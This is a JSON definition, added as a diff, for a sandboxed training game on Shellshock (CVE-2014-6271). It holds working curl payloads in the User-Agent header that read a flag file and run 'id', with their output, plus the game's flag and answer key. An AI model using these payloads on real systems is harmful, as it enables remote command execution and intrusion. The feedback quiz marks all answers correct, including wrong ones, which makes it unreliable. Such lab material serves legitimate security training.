@@ -1,0 +1,328 @@
+{
+  "title": "Shellshock CVE-2014-6271 — Hartfield Energy",
+  "description": "Exploit the Shellshock bash vulnerability via an Apache CGI script to execute arbitrary commands and retrieve a hidden flag.",
+  "prerequisites": [],
+  "outcomes": [
+    "Understand how Shellshock (CVE-2014-6271) works: environment variable function definitions that trigger arbitrary code execution.",
+    "Identify a CGI endpoint vulnerable to Shellshock and confirm exploitation via HTTP header injection.",
+    "Use the Shellshock payload to execute arbitrary commands as the web server user.",
+    "Distinguish between the web server process user and root, and understand the implications of each."
+  ],
+  "state": "UNRELEASED",
+  "show_stepper_bar": true,
+  "variant_sandboxes": false,
+  "estimated_duration": 50,
+  "levels": [
+    {
+      "title": "Introduction",
+      "level_type": "INFO_LEVEL",
+      "order": 0,
+      "estimated_duration": 0,
+      "content": "# General information — please read carefully\n\n* Each level builds on the previous one. Do not skip ahead.\n* If you get stuck, use the hints — or search for the technique online.\n* This exercise is for educational purposes only. Only attack systems within your sandbox.\n\n# Storyline\n\nYou are a junior penetration tester at SecureWave Ltd. Your current engagement is with **Hartfield Energy Systems**, an industrial energy monitoring company whose legacy IT infrastructure was built in the mid-2000s and has never been fully modernised. Hartfield's operations team relies on a web-facing server status page — a CGI script written in 2010 that runs via Apache and returns a quick health check whenever anyone hits the endpoint.\n\nThe word 'legacy' should always raise a flag. When you ask the IT team when the script was last updated, the answer is a long pause followed by 'it's always worked, so we've never touched it'. That is exactly the kind of answer that precedes a critical finding.\n\nIn September 2014, a catastrophic vulnerability was disclosed in GNU bash — the shell interpreter used on nearly every Linux system at the time. Nicknamed **Shellshock**, CVE-2014-6271 allowed an attacker to embed shell commands inside specially crafted environment variables in a way that bash would silently execute when it started up. Apache CGI scripts pass HTTP request headers directly as environment variables to the script's interpreter. If that interpreter is a vulnerable version of bash, every HTTP request becomes an arbitrary command execution channel.\n\nThe patch for Shellshock was released within days of disclosure. But patching requires someone to actually run the update — and at Hartfield Energy, nobody ever looked at that particular server again after 2014. The CGI script is still running. Its bash interpreter is still vulnerable.\n\nYour mission: find the web service, locate the CGI endpoint, identify the CVE, craft the exploit payload, retrieve the flag from outside the webroot, and confirm what user the web process runs as. This is a textbook real-world scenario — CVE-2014-6271 was actively exploited in the wild for years after disclosure against exactly this class of target."
+    },
+    {
+      "title": "Get Access",
+      "level_type": "ACCESS_LEVEL",
+      "order": 1,
+      "estimated_duration": 0,
+      "passkey": "start",
+      "cloud_content": "SSH to your attacker machine at **10.1.28.23** using your assigned credentials. Your target is the Hartfield Energy server at **10.1.28.10** (HTTP port 80).\n\nConfirm the web service is reachable:\n\n```\ncurl -s http://10.1.28.10/\n```\n\nDo not attack anything outside this sandbox. Submit **start** to begin.",
+      "local_content": "The target web service is running locally on port **80**:\n\n```\ncurl -s http://127.0.0.1/\n```\n\nSubmit **start** to begin."
+    },
+    {
+      "title": "Discover the Web Service Port",
+      "level_type": "TRAINING_LEVEL",
+      "order": 2,
+      "estimated_duration": 8,
+      "answer": "80",
+      "answer_variable_name": null,
+      "variant_answers": false,
+      "content": "Begin reconnaissance by identifying what ports are open on the Hartfield Energy server. You have been told it runs a web service — but you need to confirm the port and identify the web server software before you can probe further.\n\nRun an nmap service version scan:\n\n```\nnmap -sV 10.1.28.10\n```\n\nThis will show you all listening TCP ports and attempt to identify what software is running on each one. Look for the standard HTTP port — the port that Apache uses to serve web content over the unencrypted HTTP protocol.\n\nNote the exact port number shown in the nmap output for the HTTP service.\n\n**What port is the web service listening on?**",
+      "solution": "```\n$ nmap -sV 10.1.28.10\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH ...\n80/tcp open  http    Apache httpd ...\n```\n\nThe web service is on port **80** — the standard HTTP port.",
+      "solution_penalized": false,
+      "hints": [
+        {
+          "title": "What port does HTTP use by default?",
+          "content": "HTTP (unencrypted web traffic) uses port 80 by default. HTTPS uses 443. Run nmap -sV and look for a row labelled 'http' in the SERVICE column.",
+          "hint_penalty": 5,
+          "order": 0
+        },
+        {
+          "title": "How to run nmap",
+          "content": "Run: nmap -sV 10.1.28.10. The -sV flag enables service version detection. Look at the PORT column — the number before /tcp is the port number.",
+          "hint_penalty": 10,
+          "order": 1
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 50,
+      "mitre_techniques": [
+        { "technique_key": "TA0043.T1046" }
+      ]
+    },
+    {
+      "title": "Find the CGI Endpoint",
+      "level_type": "TRAINING_LEVEL",
+      "order": 3,
+      "estimated_duration": 8,
+      "answer": "Server status: OK",
+      "answer_variable_name": null,
+      "variant_answers": false,
+      "content": "With the web service confirmed on port 80, the next step is to locate the CGI script. CGI (Common Gateway Interface) scripts are executable programs that Apache runs in response to specific URL requests, passing HTTP request data as environment variables — which is precisely what makes them vulnerable to Shellshock.\n\nAccording to Hartfield's documentation, the server hosts a status-check endpoint. CGI scripts on Apache are conventionally served from the `/cgi-bin/` directory. The status script is named `status.cgi`.\n\nAccess the CGI endpoint:\n\n```\ncurl -s http://10.1.28.10/cgi-bin/status.cgi\n```\n\nYou should receive a plain-text response from the script confirming that it is running. Note the exact text of the first line of the response — this is what a normal, non-exploited request returns.\n\n**What is the first line of the response from /cgi-bin/status.cgi?**",
+      "solution": "```\n$ curl -s http://10.1.28.10/cgi-bin/status.cgi\nServer status: OK\nUptime check: nominal\n```\n\nThe first line of the normal response is **Server status: OK**.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "What is a CGI script?",
+          "content": "CGI scripts are programs Apache executes server-side and returns their output as the HTTP response. They live in /cgi-bin/. Access them just like a regular URL: curl http://target/cgi-bin/scriptname.cgi",
+          "hint_penalty": 10,
+          "order": 0
+        },
+        {
+          "title": "What does the script return?",
+          "content": "Run: curl -s http://10.1.28.10/cgi-bin/status.cgi. The script outputs a plain-text status message. The first line starts with 'Server status'.",
+          "hint_penalty": 20,
+          "order": 1
+        },
+        {
+          "title": "The exact first line",
+          "content": "The first line of the response is: Server status: OK",
+          "hint_penalty": 30,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 100,
+      "mitre_techniques": [
+        { "technique_key": "TA0043.T1592" }
+      ]
+    },
+    {
+      "title": "Identify the CVE",
+      "level_type": "TRAINING_LEVEL",
+      "order": 4,
+      "estimated_duration": 8,
+      "answer": "CVE-2014-6271",
+      "answer_variable_name": null,
+      "variant_answers": false,
+      "content": "You have confirmed an Apache CGI endpoint. The scenario describes a server that has not been patched since 2010 and runs bash as the CGI interpreter. This combination has a famous vulnerability.\n\nIn September 2014, a critical vulnerability was disclosed in GNU bash affecting how bash processed function definitions stored in environment variables. When bash started up, it would parse any exported environment variable that looked like a function definition — and critically, it would also execute any commands that appeared AFTER the function definition in the same variable. Apache CGI passes HTTP request headers as environment variables (for example, HTTP_USER_AGENT for the User-Agent header). This meant an attacker could put shell commands into an HTTP header, and bash would execute them.\n\nThis vulnerability was assigned a CVE identifier and nicknamed 'Shellshock'. It affected all unpatched bash versions and was actively exploited in the wild for years.\n\n**What is the CVE number for the bash environment variable command injection vulnerability disclosed in September 2014?** (format: CVE-YYYY-NNNNN)",
+      "solution": "The vulnerability is **CVE-2014-6271** — the Shellshock bash vulnerability. It was patched in bash 4.3 patch 25 and later versions. Unpatched systems running CGI scripts with bash as the interpreter remain vulnerable.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "What year was Shellshock disclosed?",
+          "content": "Shellshock was publicly disclosed in September 2014. CVE numbers use the format CVE-YEAR-NUMBER, so you are looking for a CVE starting with CVE-2014-.",
+          "hint_penalty": 15,
+          "order": 0
+        },
+        {
+          "title": "What is the full CVE number?",
+          "content": "The original Shellshock disclosure has CVE number CVE-2014-6271. There are related CVEs (e.g. 6277, 7169) but 6271 is the primary one.",
+          "hint_penalty": 25,
+          "order": 1
+        },
+        {
+          "title": "The exact CVE",
+          "content": "The answer is CVE-2014-6271.",
+          "hint_penalty": 30,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 100,
+      "mitre_techniques": [
+        { "technique_key": "TA0001.T1190" }
+      ]
+    },
+    {
+      "title": "Identify the Injection Header",
+      "level_type": "TRAINING_LEVEL",
+      "order": 5,
+      "estimated_duration": 8,
+      "answer": "User-Agent",
+      "answer_variable_name": null,
+      "variant_answers": false,
+      "content": "You now understand the vulnerability: Shellshock executes commands embedded in environment variables when bash starts. Apache CGI scripts pass HTTP request headers as environment variables. The next question is: which HTTP header should you inject your payload into?\n\nApache maps HTTP headers to environment variables using the prefix `HTTP_`. For example:\n- The `User-Agent` header becomes `HTTP_USER_AGENT`\n- The `Referer` header becomes `HTTP_REFERER`\n- The `Cookie` header becomes `HTTP_COOKIE`\n\nAny of these could theoretically carry a Shellshock payload. In practice, the `User-Agent` header is the standard choice for Shellshock exploits because:\n1. Apache always passes it as an environment variable\n2. It is not filtered or sanitised by most web applications\n3. It is included in almost every HTTP request, making it universally available\n\nThe Shellshock payload format is:\n```\n() { :; }; echo; /bin/command to run\n```\n\nThe `() { :; };` part defines a dummy function (which triggers bash's parsing). Everything after `};` is executed as a shell command. The `echo;` adds an empty line to satisfy HTTP/CGI response formatting.\n\n**Which HTTP header do you inject the Shellshock payload into?**",
+      "solution": "The standard Shellshock injection header is **User-Agent**. It is always passed to CGI scripts by Apache and is never validated, making it the most reliable vector.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Which headers does Apache pass to CGI?",
+          "content": "Apache converts HTTP headers to environment variables with the HTTP_ prefix. Common headers passed to CGI include User-Agent, Referer, and Cookie. The most universally used for Shellshock is User-Agent.",
+          "hint_penalty": 15,
+          "order": 0
+        },
+        {
+          "title": "How do I set a custom header with curl?",
+          "content": "Use curl -H 'Header-Name: value'. For example: curl -H 'User-Agent: my payload' http://target/cgi-bin/status.cgi",
+          "hint_penalty": 25,
+          "order": 1
+        },
+        {
+          "title": "The answer",
+          "content": "The header is User-Agent. Set it to the Shellshock payload using curl -H 'User-Agent: () { :; }; echo; /bin/command'",
+          "hint_penalty": 30,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 100,
+      "mitre_techniques": [
+        { "technique_key": "TA0001.T1190" }
+      ]
+    },
+    {
+      "title": "Execute the Exploit and Retrieve the Flag",
+      "level_type": "TRAINING_LEVEL",
+      "order": 6,
+      "estimated_duration": 10,
+      "answer": "WMG{sh3llsh0ck_cve_2014_6271_env_vars_are_scary}",
+      "answer_variable_name": null,
+      "variant_answers": false,
+      "content": "You have everything you need. Combine what you have learned:\n- The vulnerable CGI endpoint: `/cgi-bin/status.cgi`\n- The injection header: `User-Agent`\n- The flag location: `/opt/flag.txt` (outside the webroot, but readable by the Apache process)\n- The payload format: `() { :; }; echo; /bin/command`\n\nConstruct the exploit:\n\n```\ncurl -s http://10.1.28.10/cgi-bin/status.cgi \\\n  -H 'User-Agent: () { :; }; echo; /bin/cat /opt/flag.txt'\n```\n\nBreaking down the payload:\n- `() { :; };` — defines a trivial function, triggering bash's parsing mode\n- `echo;` — outputs an empty line (required by CGI to separate headers from body)\n- `/bin/cat /opt/flag.txt` — the actual command: reads the flag file\n\nThe flag content will appear in the response output before the normal CGI script output. Look for the `WMG{...}` string.\n\nIn a real engagement, instead of reading a file you could run any command — download a reverse shell, read /etc/shadow, or pivot to internal systems.\n\n**Submit the flag from /opt/flag.txt.**",
+      "solution": "```\n$ curl -s http://10.1.28.10/cgi-bin/status.cgi \\\n    -H 'User-Agent: () { :; }; echo; /bin/cat /opt/flag.txt'\n\nWMG{sh3llsh0ck_cve_2014_6271_env_vars_are_scary}\nServer status: OK\nUptime check: nominal\n```\n\nThe flag appears before the normal script output because bash executes the injected command before the script runs.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "How to set the payload in curl",
+          "content": "Use curl -H 'User-Agent: PAYLOAD'. The full Shellshock payload is: () { :; }; echo; /bin/cat /opt/flag.txt — put this as the User-Agent value.",
+          "hint_penalty": 20,
+          "order": 0
+        },
+        {
+          "title": "Why does echo; come before the command?",
+          "content": "CGI responses need a blank line to separate HTTP headers from the body. The echo; outputs that blank line. Without it, the Apache response may be malformed.",
+          "hint_penalty": 30,
+          "order": 1
+        },
+        {
+          "title": "The full command",
+          "content": "Run: curl -s http://10.1.28.10/cgi-bin/status.cgi -H 'User-Agent: () { :; }; echo; /bin/cat /opt/flag.txt'",
+          "hint_penalty": 40,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 150,
+      "mitre_techniques": [
+        { "technique_key": "TA0002.T1059.004" }
+      ]
+    },
+    {
+      "title": "Identify the Web Server User",
+      "level_type": "TRAINING_LEVEL",
+      "order": 7,
+      "estimated_duration": 5,
+      "answer": "www-data",
+      "answer_variable_name": null,
+      "variant_answers": false,
+      "content": "You have achieved remote code execution on the Hartfield Energy server. But what user are you running as? This matters enormously in a real engagement — if the web server runs as root you have immediate full system access, but if it runs as a restricted user (as it should), your access is limited to what that user can read and write.\n\nUse the Shellshock RCE to run the `id` command, which reports the current user's identity:\n\n```\ncurl -s http://10.1.28.10/cgi-bin/status.cgi \\\n  -H 'User-Agent: () { :; }; echo; id'\n```\n\nThe output will show the user ID, group ID, and username of the process executing your command. Look for the username in parentheses after `uid=NNNN`.\n\nA well-configured web server runs Apache as a dedicated low-privilege user — not root. This is a fundamental security principle: limit the damage from a compromise by running services as accounts with the minimum necessary privileges.\n\n**What is the username of the user that Apache is running as?**",
+      "solution": "```\n$ curl -s http://10.1.28.10/cgi-bin/status.cgi \\\n    -H 'User-Agent: () { :; }; echo; id'\n\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\nServer status: OK\nUptime check: nominal\n```\n\nApache runs as **www-data** — a dedicated low-privilege user. This is correct security practice, even if the server is vulnerable to Shellshock.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "How to check the current user",
+          "content": "Use the id command (or whoami) via the Shellshock RCE. Replace /bin/cat /opt/flag.txt with id in the payload: curl -H 'User-Agent: () { :; }; echo; id' ...",
+          "hint_penalty": 15,
+          "order": 0
+        },
+        {
+          "title": "What user does Apache typically run as?",
+          "content": "On Debian/Ubuntu systems, Apache runs as the 'www-data' user. This is the standard dedicated web server account with limited system privileges.",
+          "hint_penalty": 25,
+          "order": 1
+        },
+        {
+          "title": "The answer",
+          "content": "The Apache process runs as www-data. Look for uid=33(www-data) in the id command output.",
+          "hint_penalty": 30,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 100,
+      "mitre_techniques": [
+        { "technique_key": "TA0007.T1033" }
+      ]
+    },
+    {
+      "title": "Feedback",
+      "level_type": "ASSESSMENT_LEVEL",
+      "order": 8,
+      "estimated_duration": 5,
+      "assessment_type": "QUESTIONNAIRE",
+      "instructions": "Please answer these questions to help us improve this game.",
+      "questions": [
+        {
+          "question_type": "MCQ",
+          "text": "How difficult did you find this game?",
+          "points": 0,
+          "penalty": 0,
+          "order": 0,
+          "answer_required": true,
+          "choices": [
+            { "text": "Too easy",      "correct": true, "order": 0 },
+            { "text": "About right",   "correct": true, "order": 1 },
+            { "text": "Too difficult", "correct": true, "order": 2 }
+          ]
+        },
+        {
+          "question_type": "MCQ",
+          "text": "Before this game, had you heard of the Shellshock vulnerability?",
+          "points": 0,
+          "penalty": 0,
+          "order": 1,
+          "answer_required": true,
+          "choices": [
+            { "text": "Yes, I knew how to exploit it",        "correct": true, "order": 0 },
+            { "text": "I had heard of it but not tried it",   "correct": true, "order": 1 },
+            { "text": "No, this was completely new to me",    "correct": true, "order": 2 }
+          ]
+        },
+        {
+          "question_type": "MCQ",
+          "text": "How clear were the level instructions?",
+          "points": 0,
+          "penalty": 0,
+          "order": 2,
+          "answer_required": true,
+          "choices": [
+            { "text": "Very clear",         "correct": true, "order": 0 },
+            { "text": "Mostly clear",        "correct": true, "order": 1 },
+            { "text": "Confusing at times",  "correct": true, "order": 2 },
+            { "text": "Hard to follow",      "correct": true, "order": 3 }
+          ]
+        },
+        {
+          "question_type": "MCQ",
+          "text": "Why is running CGI scripts with bash as interpreter particularly dangerous on unpatched systems?",
+          "points": 0,
+          "penalty": 0,
+          "order": 3,
+          "answer_required": true,
+          "choices": [
+            { "text": "HTTP headers are passed as environment variables that bash parses on startup", "correct": true, "order": 0 },
+            { "text": "CGI scripts always run as root",                                              "correct": true, "order": 1 },
+            { "text": "Apache leaks source code for bash scripts",                                   "correct": true, "order": 2 },
+            { "text": "bash scripts cannot be sandboxed",                                            "correct": true, "order": 3 }
+          ]
+        },
+        {
+          "question_type": "FFQ",
+          "text": "What would you change or add to improve this game?",
+          "points": 0,
+          "penalty": 0,
+          "order": 4,
+          "answer_required": false,
+          "choices": []
+        }
+      ]
+    }
+  ]
+}
